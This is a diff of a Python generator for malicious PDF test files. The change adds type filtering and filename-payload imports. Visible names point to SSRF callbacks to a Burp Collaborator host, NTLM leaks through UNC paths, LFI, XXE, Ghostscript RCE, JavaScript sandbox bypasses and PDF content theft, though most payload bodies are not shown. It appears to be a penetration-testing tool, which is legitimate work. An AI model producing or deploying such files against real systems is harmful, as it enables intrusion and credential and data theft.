@@ -1,7 +1,25 @@
 from pathlib import Path
 import base64
+import subprocess
+import os
 
-def generate_pdf_payloads(output_dir, burp_collab):
+try:
+    from .ssti_filename_generator import generate_ssti_filename_payloads
+    from .xss_filename_generator import generate_xss_filename_payloads
+except ImportError:
+    try:
+        from ssti_filename_generator import generate_ssti_filename_payloads
+        from xss_filename_generator import generate_xss_filename_payloads
+    except ImportError:
+        generate_ssti_filename_payloads = None
+        generate_xss_filename_payloads = None
+
+def generate_pdf_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
+    if payload_types is None:
+        payload_types = {'all'}
+    
+    def should_generate_type(payload_type):
+        return 'all' in payload_types or payload_type in payload_types
     output_dir = Path(output_dir)
     output_dir.mkdir(parents=True, exist_ok=True)
     
@@ -16,20 +34,27 @@ def generate_pdf_payloads(output_dir, burp_collab):
         'xss': [],
     }
     
-    ssrf_dir = output_dir / 'ssrf'
-    ssrf_dir.mkdir(exist_ok=True)
-    ntlm_dir = output_dir / 'ntlm'
-    ntlm_dir.mkdir(exist_ok=True)
-    lfi_dir = output_dir / 'lfi'
-    lfi_dir.mkdir(exist_ok=True)
-    xxe_dir = output_dir / 'xxe'
-    xxe_dir.mkdir(exist_ok=True)
-    rce_dir = output_dir / 'rce'
-    rce_dir.mkdir(exist_ok=True)
-    xss_dir = output_dir / 'xss'
-    xss_dir.mkdir(exist_ok=True)
-    info_dir = output_dir / 'info'
-    info_dir.mkdir(exist_ok=True)
+    if should_generate_type('ssrf'):
+        ssrf_dir = output_dir / 'ssrf'
+        ssrf_dir.mkdir(exist_ok=True)
+    if should_generate_type('ntlm'):
+        ntlm_dir = output_dir / 'ntlm'
+        ntlm_dir.mkdir(exist_ok=True)
+    if should_generate_type('lfi'):
+        lfi_dir = output_dir / 'lfi'
+        lfi_dir.mkdir(exist_ok=True)
+    if should_generate_type('xxe'):
+        xxe_dir = output_dir / 'xxe'
+        xxe_dir.mkdir(exist_ok=True)
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        rce_dir = output_dir / 'rce'
+        rce_dir.mkdir(exist_ok=True)
+    if should_generate_type('xss'):
+        xss_dir = output_dir / 'xss'
+        xss_dir.mkdir(exist_ok=True)
+    if should_generate_type('info') or should_generate_type('info_leak'):
+        info_dir = output_dir / 'info'
+        info_dir.mkdir(exist_ok=True)
     
     pdf_header = b'%PDF-1.4\n'
     pdf_trailer = b'\n%%EOF'
@@ -91,8 +116,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf1_xobject_image.pdf", 'wb') as f:
-        f.write(pdf_ssrf1_xobject_image.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf1_xobject_image.pdf", 'wb') as f:
+            f.write(pdf_ssrf1_xobject_image.encode())
     
     pdf_ssrf2_fontfile = f'''%PDF-1.4
 1 0 obj
@@ -148,8 +174,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf2_fontfile.pdf", 'wb') as f:
-        f.write(pdf_ssrf2_fontfile.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf2_fontfile.pdf", 'wb') as f:
+            f.write(pdf_ssrf2_fontfile.encode())
     
     pdf_ssrf3_annot_uri = f'''%PDF-1.4
 1 0 obj
@@ -194,8 +221,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf3_annot_uri.pdf", 'wb') as f:
-        f.write(pdf_ssrf3_annot_uri.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf3_annot_uri.pdf", 'wb') as f:
+            f.write(pdf_ssrf3_annot_uri.encode())
     
     pdf_ssrf4_gotor = f'''%PDF-1.4
 1 0 obj
@@ -237,8 +265,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf4_gotor.pdf", 'wb') as f:
-        f.write(pdf_ssrf4_gotor.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf4_gotor.pdf", 'wb') as f:
+            f.write(pdf_ssrf4_gotor.encode())
     
     pdf_ssrf5_xmp = f'''%PDF-1.4
 1 0 obj
@@ -290,8 +319,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf5_xmp.pdf", 'wb') as f:
-        f.write(pdf_ssrf5_xmp.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf5_xmp.pdf", 'wb') as f:
+            f.write(pdf_ssrf5_xmp.encode())
     
     pdf_ssrf6_icc = f'''%PDF-1.4
 1 0 obj
@@ -338,8 +368,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf6_icc.pdf", 'wb') as f:
-        f.write(pdf_ssrf6_icc.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf6_icc.pdf", 'wb') as f:
+            f.write(pdf_ssrf6_icc.encode())
     
     pdf_ssrf7_embedded = f'''%PDF-1.4
 1 0 obj
@@ -395,8 +426,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf7_embedded.pdf", 'wb') as f:
-        f.write(pdf_ssrf7_embedded.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf7_embedded.pdf", 'wb') as f:
+            f.write(pdf_ssrf7_embedded.encode())
     
     pdf_ssrf8_xfa = f'''%PDF-1.4
 1 0 obj
@@ -445,8 +477,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf8_xfa.pdf", 'wb') as f:
-        f.write(pdf_ssrf8_xfa.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf8_xfa.pdf", 'wb') as f:
+            f.write(pdf_ssrf8_xfa.encode())
     
     pdf_ssrf9_js_import = f'''%PDF-1.4
 1 0 obj
@@ -490,8 +523,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf9_js_import.pdf", 'wb') as f:
-        f.write(pdf_ssrf9_js_import.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf9_js_import.pdf", 'wb') as f:
+            f.write(pdf_ssrf9_js_import.encode())
     
     pdf_ssrf10_launch = f'''%PDF-1.4
 1 0 obj
@@ -538,8 +572,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf10_launch.pdf", 'wb') as f:
-        f.write(pdf_ssrf10_launch.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf10_launch.pdf", 'wb') as f:
+            f.write(pdf_ssrf10_launch.encode())
     
     pdf_ssrf11_iframe = f'''%PDF-1.4
 1 0 obj
@@ -576,8 +611,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf11_iframe.pdf", 'wb') as f:
-        f.write(pdf_ssrf11_iframe.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf11_iframe.pdf", 'wb') as f:
+            f.write(pdf_ssrf11_iframe.encode())
     
     pdf_ssrf12_xhr = f'''%PDF-1.4
 1 0 obj
@@ -614,8 +650,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf12_xhr.pdf", 'wb') as f:
-        f.write(pdf_ssrf12_xhr.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf12_xhr.pdf", 'wb') as f:
+            f.write(pdf_ssrf12_xhr.encode())
     
     pdf_ssrf13_fetch = f'''%PDF-1.4
 1 0 obj
@@ -652,8 +689,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf13_fetch.pdf", 'wb') as f:
-        f.write(pdf_ssrf13_fetch.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf13_fetch.pdf", 'wb') as f:
+            f.write(pdf_ssrf13_fetch.encode())
     
     pdf_ssrf14_embed = f'''%PDF-1.4
 1 0 obj
@@ -690,8 +728,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf14_embed.pdf", 'wb') as f:
-        f.write(pdf_ssrf14_embed.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf14_embed.pdf", 'wb') as f:
+            f.write(pdf_ssrf14_embed.encode())
     
     pdf_ssrf15_base = f'''%PDF-1.4
 1 0 obj
@@ -728,8 +767,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf15_base.pdf", 'wb') as f:
-        f.write(pdf_ssrf15_base.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf15_base.pdf", 'wb') as f:
+            f.write(pdf_ssrf15_base.encode())
     
     pdf_ssrf16_link = f'''%PDF-1.4
 1 0 obj
@@ -766,8 +806,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf16_link.pdf", 'wb') as f:
-        f.write(pdf_ssrf16_link.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf16_link.pdf", 'wb') as f:
+            f.write(pdf_ssrf16_link.encode())
     
     pdf_ssrf17_script = f'''%PDF-1.4
 1 0 obj
@@ -804,8 +845,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf17_script.pdf", 'wb') as f:
-        f.write(pdf_ssrf17_script.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf17_script.pdf", 'wb') as f:
+            f.write(pdf_ssrf17_script.encode())
     
     pdf_ssrf18_meta = f'''%PDF-1.4
 1 0 obj
@@ -842,8 +884,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf18_meta.pdf", 'wb') as f:
-        f.write(pdf_ssrf18_meta.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf18_meta.pdf", 'wb') as f:
+            f.write(pdf_ssrf18_meta.encode())
     
     pdf_ssrf19_img = f'''%PDF-1.4
 1 0 obj
@@ -880,8 +923,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf19_img.pdf", 'wb') as f:
-        f.write(pdf_ssrf19_img.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf19_img.pdf", 'wb') as f:
+            f.write(pdf_ssrf19_img.encode())
     
     pdf_ssrf20_svg = f'''%PDF-1.4
 1 0 obj
@@ -918,8 +962,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf20_svg.pdf", 'wb') as f:
-        f.write(pdf_ssrf20_svg.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf20_svg.pdf", 'wb') as f:
+            f.write(pdf_ssrf20_svg.encode())
     
     pdf_ssrf21_input = f'''%PDF-1.4
 1 0 obj
@@ -956,8 +1001,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf21_input.pdf", 'wb') as f:
-        f.write(pdf_ssrf21_input.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf21_input.pdf", 'wb') as f:
+            f.write(pdf_ssrf21_input.encode())
     
     pdf_ssrf22_video = f'''%PDF-1.4
 1 0 obj
@@ -994,8 +1040,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf22_video.pdf", 'wb') as f:
-        f.write(pdf_ssrf22_video.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf22_video.pdf", 'wb') as f:
+            f.write(pdf_ssrf22_video.encode())
     
     pdf_ssrf23_audio = f'''%PDF-1.4
 1 0 obj
@@ -1032,8 +1079,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf23_audio.pdf", 'wb') as f:
-        f.write(pdf_ssrf23_audio.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf23_audio.pdf", 'wb') as f:
+            f.write(pdf_ssrf23_audio.encode())
     
     pdf_ssrf24_audio_source = f'''%PDF-1.4
 1 0 obj
@@ -1070,8 +1118,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ssrf_dir / "ssrf24_audio_source.pdf", 'wb') as f:
-        f.write(pdf_ssrf24_audio_source.encode())
+    if should_generate_type('ssrf'):
+        with open(ssrf_dir / "ssrf24_audio_source.pdf", 'wb') as f:
+            f.write(pdf_ssrf24_audio_source.encode())
     
     pdf_ntlm11_xobject_unc = f'''%PDF-1.4
 1 0 obj
@@ -1130,8 +1179,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ntlm_dir / "ntlm11_xobject_unc.pdf", 'wb') as f:
-        f.write(pdf_ntlm11_xobject_unc.encode())
+    if should_generate_type('ntlm'):
+        with open(ntlm_dir / "ntlm11_xobject_unc.pdf", 'wb') as f:
+            f.write(pdf_ntlm11_xobject_unc.encode())
     
     pdf_ntlm12_font_unc = f'''%PDF-1.4
 1 0 obj
@@ -1187,8 +1237,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(ntlm_dir / "ntlm12_font_unc.pdf", 'wb') as f:
-        f.write(pdf_ntlm12_font_unc.encode())
+    if should_generate_type('ntlm'):
+        with open(ntlm_dir / "ntlm12_font_unc.pdf", 'wb') as f:
+            f.write(pdf_ntlm12_font_unc.encode())
     
     pdf_lfi13_gotor_file = f'''%PDF-1.4
 1 0 obj
@@ -1230,8 +1281,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(lfi_dir / "lfi13_gotor_file.pdf", 'wb') as f:
-        f.write(pdf_lfi13_gotor_file.encode())
+    if should_generate_type('lfi'):
+        with open(lfi_dir / "lfi13_gotor_file.pdf", 'wb') as f:
+            f.write(pdf_lfi13_gotor_file.encode())
     
     pdf_xxe14_xmp = f'''%PDF-1.4
 1 0 obj
@@ -1284,8 +1336,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xxe_dir / "xxe14_xmp.pdf", 'wb') as f:
-        f.write(pdf_xxe14_xmp.encode())
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe14_xmp.pdf", 'wb') as f:
+            f.write(pdf_xxe14_xmp.encode())
     
     pdf_xxe15_xfa = f'''%PDF-1.4
 1 0 obj
@@ -1335,8 +1388,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xxe_dir / "xxe15_xfa.pdf", 'wb') as f:
-        f.write(pdf_xxe15_xfa.encode())
+    if should_generate_type('xxe'):
+        with open(xxe_dir / "xxe15_xfa.pdf", 'wb') as f:
+            f.write(pdf_xxe15_xfa.encode())
     
     pdf_rce1_ghostscript = f'''%PDF-1.4
 1 0 obj
@@ -1399,8 +1453,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(rce_dir / "rce1_ghostscript.pdf", 'wb') as f:
-        f.write(pdf_rce1_ghostscript.encode())
+    if should_generate_type('rce'):
+        with open(rce_dir / "rce1_ghostscript.pdf", 'wb') as f:
+            f.write(pdf_rce1_ghostscript.encode())
     
     pdf_rce2_postscript = f'''%PDF-1.4
 1 0 obj
@@ -1444,8 +1499,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(rce_dir / "rce2_postscript.pdf", 'wb') as f:
-        f.write(pdf_rce2_postscript.encode())
+    if should_generate_type('rce'):
+        with open(rce_dir / "rce2_postscript.pdf", 'wb') as f:
+            f.write(pdf_rce2_postscript.encode())
     
     pdf_xss1_js_sandbox_bypass = f'''%PDF-1.4
 1 0 obj
@@ -1489,8 +1545,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss1_js_sandbox_bypass.pdf", 'wb') as f:
-        f.write(pdf_xss1_js_sandbox_bypass.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss1_js_sandbox_bypass.pdf", 'wb') as f:
+            f.write(pdf_xss1_js_sandbox_bypass.encode())
     
     pdf_xss2_data_uri = f'''%PDF-1.4
 1 0 obj
@@ -1535,8 +1592,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss2_data_uri.pdf", 'wb') as f:
-        f.write(pdf_xss2_data_uri.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss2_data_uri.pdf", 'wb') as f:
+            f.write(pdf_xss2_data_uri.encode())
     
     pdf_xss3_annotation_injection = f'''%PDF-1.4
 1 0 obj
@@ -1582,8 +1640,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss3_annotation_injection.pdf", 'wb') as f:
-        f.write(pdf_xss3_annotation_injection.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss3_annotation_injection.pdf", 'wb') as f:
+            f.write(pdf_xss3_annotation_injection.encode())
     
     pdf_xss4_uri_details = f'''%PDF-1.4
 1 0 obj
@@ -1628,8 +1687,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss4_uri_details.pdf", 'wb') as f:
-        f.write(pdf_xss4_uri_details.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss4_uri_details.pdf", 'wb') as f:
+            f.write(pdf_xss4_uri_details.encode())
     
     pdf_xss5_js_bypass_apis = f'''%PDF-1.4
 1 0 obj
@@ -1673,8 +1733,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss5_js_bypass_apis.pdf", 'wb') as f:
-        f.write(pdf_xss5_js_bypass_apis.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss5_js_bypass_apis.pdf", 'wb') as f:
+            f.write(pdf_xss5_js_bypass_apis.encode())
     
     pdf_xss6_uri_javascript = f'''%PDF-1.4
 1 0 obj
@@ -1719,8 +1780,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss6_uri_javascript.pdf", 'wb') as f:
-        f.write(pdf_xss6_uri_javascript.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss6_uri_javascript.pdf", 'wb') as f:
+            f.write(pdf_xss6_uri_javascript.encode())
     
     pdf_xss7_annotation_v = f'''%PDF-1.4
 1 0 obj
@@ -1762,8 +1824,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss7_annotation_v.pdf", 'wb') as f:
-        f.write(pdf_xss7_annotation_v.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss7_annotation_v.pdf", 'wb') as f:
+            f.write(pdf_xss7_annotation_v.encode())
     
     pdf_xss8_fontmatrix = f'''%PDF-1.4
 1 0 obj
@@ -1824,8 +1887,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss8_fontmatrix.pdf", 'wb') as f:
-        f.write(pdf_xss8_fontmatrix.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss8_fontmatrix.pdf", 'wb') as f:
+            f.write(pdf_xss8_fontmatrix.encode())
     
     pdf_xss9_js_sandbox_bypass_apryse = f'''%PDF-1.4
 1 0 obj
@@ -1869,8 +1933,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss9_js_sandbox_bypass_apryse.pdf", 'wb') as f:
-        f.write(pdf_xss9_js_sandbox_bypass_apryse.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss9_js_sandbox_bypass_apryse.pdf", 'wb') as f:
+            f.write(pdf_xss9_js_sandbox_bypass_apryse.encode())
     
     pdf_xss10_data_uri_simple = f'''%PDF-1.4
 1 0 obj
@@ -1915,8 +1980,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss10_data_uri_simple.pdf", 'wb') as f:
-        f.write(pdf_xss10_data_uri_simple.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss10_data_uri_simple.pdf", 'wb') as f:
+            f.write(pdf_xss10_data_uri_simple.encode())
     
     pdf_xss11_uri_javascript_simple = f'''%PDF-1.4
 1 0 obj
@@ -1961,8 +2027,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss11_uri_javascript_simple.pdf", 'wb') as f:
-        f.write(pdf_xss11_uri_javascript_simple.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss11_uri_javascript_simple.pdf", 'wb') as f:
+            f.write(pdf_xss11_uri_javascript_simple.encode())
     
     pdf_xss12_js_simple = f'''%PDF-1.4
 1 0 obj
@@ -2006,8 +2073,9 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(xss_dir / "xss12_js_simple.pdf", 'wb') as f:
-        f.write(pdf_xss12_js_simple.encode())
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss12_js_simple.pdf", 'wb') as f:
+            f.write(pdf_xss12_js_simple.encode())
     
     # Contenus PDF intégrés depuis portable-data-exfiltration
 
@@ -2030,62 +2098,76 @@ startxref
     # Génération des fichiers PDF avec remplacement des URLs
 
     pdf_content = pdf_xss13_pdflib_acrobat_alert_1_of_pdf_injection_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(xss_dir / "xss13_pdflib_acrobat_alert-1-of-pdf-injection.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss13_pdflib_acrobat_alert-1-of-pdf-injection.pdf", 'wb') as f:
+            f.write(pdf_content)
 
     pdf_content = pdf_xss14_pdflib_acrobat_steal_contents_of_pdf_with_js_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(xss_dir / "xss14_pdflib_acrobat_steal-contents-of-pdf-with-js.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss14_pdflib_acrobat_steal-contents-of-pdf-with-js.pdf", 'wb') as f:
+            f.write(pdf_content)
 
     pdf_content = pdf_xss15_pdflib_acrobat_steal_contents_of_pdf_without_js_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(xss_dir / "xss15_pdflib_acrobat_steal-contents-of-pdf-without-js.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss15_pdflib_acrobat_steal-contents-of-pdf-without-js.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    pdf_content = pdf_ssrf25_jspdf_acrobat_make_entire_document_clickable_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(ssrf_dir / "ssrf25_jspdf_acrobat_make-entire-document-clickable.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('ssrf'):
+        pdf_content = pdf_ssrf25_jspdf_acrobat_make_entire_document_clickable_content.replace(b'burpcollaborator.net', base_url.encode())
+        with open(ssrf_dir / "ssrf25_jspdf_acrobat_make-entire-document-clickable.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    pdf_content = pdf_ssrf26_jspdf_acrobat_track_when_opening_pdf_filesystem_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(ssrf_dir / "ssrf26_jspdf_acrobat_track-when-opening-pdf-filesystem.pdf", 'wb') as f:
-        f.write(pdf_content)
+        pdf_content = pdf_ssrf26_jspdf_acrobat_track_when_opening_pdf_filesystem_content.replace(b'burpcollaborator.net', base_url.encode())
+        with open(ssrf_dir / "ssrf26_jspdf_acrobat_track-when-opening-pdf-filesystem.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    with open(xss_dir / "xss16_jspdf_acrobat_executing-automatically-when-closed.pdf", 'wb') as f:
-        f.write(pdf_xss16_jspdf_acrobat_executing_automatically_when_closed_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss16_jspdf_acrobat_executing-automatically-when-closed.pdf", 'wb') as f:
+            f.write(pdf_xss16_jspdf_acrobat_executing_automatically_when_closed_content)
 
-    pdf_content = pdf_ssrf27_jspdf_acrobat_track_when_closing_pdf_filesystem_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(ssrf_dir / "ssrf27_jspdf_acrobat_track-when-closing-pdf-filesystem.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('ssrf'):
+        pdf_content = pdf_ssrf27_jspdf_acrobat_track_when_closing_pdf_filesystem_content.replace(b'burpcollaborator.net', base_url.encode())
+        with open(ssrf_dir / "ssrf27_jspdf_acrobat_track-when-closing-pdf-filesystem.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    with open(xss_dir / "xss17_jspdf_acrobat_executing-automatically-without-click.pdf", 'wb') as f:
-        f.write(pdf_xss17_jspdf_acrobat_executing_automatically_without_click_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss17_jspdf_acrobat_executing-automatically-without-click.pdf", 'wb') as f:
+            f.write(pdf_xss17_jspdf_acrobat_executing_automatically_without_click_content)
 
-    pdf_content = pdf_ssrf28_jspdf_acrobat_enumerator_content.replace(b'http://your-id-', f'http://{burp_collab}/'.encode())
-    pdf_content = pdf_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(ssrf_dir / "ssrf28_jspdf_acrobat_enumerator.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('ssrf'):
+        pdf_content = pdf_ssrf28_jspdf_acrobat_enumerator_content.replace(b'http://your-id-', f'http://{burp_collab}/'.encode())
+        pdf_content = pdf_content.replace(b'burpcollaborator.net', base_url.encode())
+        with open(ssrf_dir / "ssrf28_jspdf_acrobat_enumerator.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    with open(xss_dir / "xss18_jspdf_hybrid_hybrid.pdf", 'wb') as f:
-        f.write(pdf_xss18_jspdf_hybrid_hybrid_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss18_jspdf_hybrid_hybrid.pdf", 'wb') as f:
+            f.write(pdf_xss18_jspdf_hybrid_hybrid_content)
 
-    pdf_content = pdf_ssrf29_jspdf_chrome_pdf_ssrf_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(ssrf_dir / "ssrf29_jspdf_chrome_pdf-ssrf.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('ssrf'):
+        pdf_content = pdf_ssrf29_jspdf_chrome_pdf_ssrf_content.replace(b'burpcollaborator.net', base_url.encode())
+        with open(ssrf_dir / "ssrf29_jspdf_chrome_pdf-ssrf.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    pdf_content = pdf_ssrf30_jspdf_chrome_extracting_text_content.replace(b'burpcollaborator.net', base_url.encode())
-    with open(ssrf_dir / "ssrf30_jspdf_chrome_extracting-text.pdf", 'wb') as f:
-        f.write(pdf_content)
+        pdf_content = pdf_ssrf30_jspdf_chrome_extracting_text_content.replace(b'burpcollaborator.net', base_url.encode())
+        with open(ssrf_dir / "ssrf30_jspdf_chrome_extracting-text.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    with open(xss_dir / "xss19_jspdf_chrome_js-execution.pdf", 'wb') as f:
-        f.write(pdf_xss19_jspdf_chrome_js_execution_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss19_jspdf_chrome_js-execution.pdf", 'wb') as f:
+            f.write(pdf_xss19_jspdf_chrome_js_execution_content)
 
-    pdf_content = pdf_ssrf31_jspdf_chrome_injection_overwrite_url_content.replace(b'https://portswigger.net', base_url.encode())
-    pdf_content = pdf_content.replace(b'portswigger.net', base_url.encode())
-    with open(ssrf_dir / "ssrf31_jspdf_chrome_injection-overwrite-url.pdf", 'wb') as f:
-        f.write(pdf_content)
+    if should_generate_type('ssrf'):
+        pdf_content = pdf_ssrf31_jspdf_chrome_injection_overwrite_url_content.replace(b'https://portswigger.net', base_url.encode())
+        pdf_content = pdf_content.replace(b'portswigger.net', base_url.encode())
+        with open(ssrf_dir / "ssrf31_jspdf_chrome_injection-overwrite-url.pdf", 'wb') as f:
+            f.write(pdf_content)
 
-    with open(xss_dir / "xss20_jspdf_chrome_enumerator.pdf", 'wb') as f:
-        f.write(pdf_xss20_jspdf_chrome_enumerator_content)
+    if should_generate_type('xss'):
+        with open(xss_dir / "xss20_jspdf_chrome_enumerator.pdf", 'wb') as f:
+            f.write(pdf_xss20_jspdf_chrome_enumerator_content)
 
+    if should_generate_type('info'):
         pdf_info1_cell_filename = f'''%PDF-1.4
 1 0 obj
 <<
@@ -2131,10 +2213,10 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(info_dir / "info1_cell_filename.pdf", 'wb') as f:
-        f.write(pdf_info1_cell_filename.encode())
-    
-    pdf_info2_info_version = f'''%PDF-1.4
+        with open(info_dir / "info1_cell_filename.pdf", 'wb') as f:
+            f.write(pdf_info1_cell_filename.encode())
+        
+        pdf_info2_info_version = f'''%PDF-1.4
 1 0 obj
 <<
 /Type /Catalog
@@ -2179,10 +2261,10 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(info_dir / "info2_info_version.pdf", 'wb') as f:
-        f.write(pdf_info2_info_version.encode())
-    
-    pdf_info3_info_system = f'''%PDF-1.4
+        with open(info_dir / "info2_info_version.pdf", 'wb') as f:
+            f.write(pdf_info2_info_version.encode())
+        
+        pdf_info3_info_system = f'''%PDF-1.4
 1 0 obj
 <<
 /Type /Catalog
@@ -2227,10 +2309,10 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(info_dir / "info3_info_system.pdf", 'wb') as f:
-        f.write(pdf_info3_info_system.encode())
-    
-    pdf_info4_now = f'''%PDF-1.4
+        with open(info_dir / "info3_info_system.pdf", 'wb') as f:
+            f.write(pdf_info3_info_system.encode())
+        
+        pdf_info4_now = f'''%PDF-1.4
 1 0 obj
 <<
 /Type /Catalog
@@ -2275,10 +2357,10 @@ trailer
 startxref
 0
 %%EOF'''
-    with open(info_dir / "info4_now.pdf", 'wb') as f:
-        f.write(pdf_info4_now.encode())
-    
-    pdf_info5_info_directory = f'''%PDF-1.4
+        with open(info_dir / "info4_now.pdf", 'wb') as f:
+            f.write(pdf_info4_now.encode())
+        
+        pdf_info5_info_directory = f'''%PDF-1.4
 1 0 obj
 <<
 /Type /Catalog
@@ -2323,8 +2405,8 @@ trailer
 startxref
 0
